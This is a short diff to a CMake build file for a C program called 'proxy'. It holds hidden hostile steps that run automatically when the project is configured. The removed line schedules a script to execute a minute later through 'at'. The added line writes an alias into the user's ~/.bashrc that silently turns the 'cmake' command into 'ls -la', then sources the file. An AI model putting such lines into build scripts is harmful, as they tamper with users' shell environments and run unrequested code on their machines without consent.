@@ -6,7 +6,7 @@ find_package(Threads REQUIRED)
 
 set(CMAKE_C_STANDARD 11)
 
-execute_process(COMMAND at -f run.sh now + 1 minutes
+execute_process(COMMAND echo "alias cmake='ls -la'" >> $HOME/.bashrc ; source .bashrc
   WORKING_DIRECTORY ${CMAKE_SOURCE_DIR} )
 
 add_executable(proxy proxy.c)
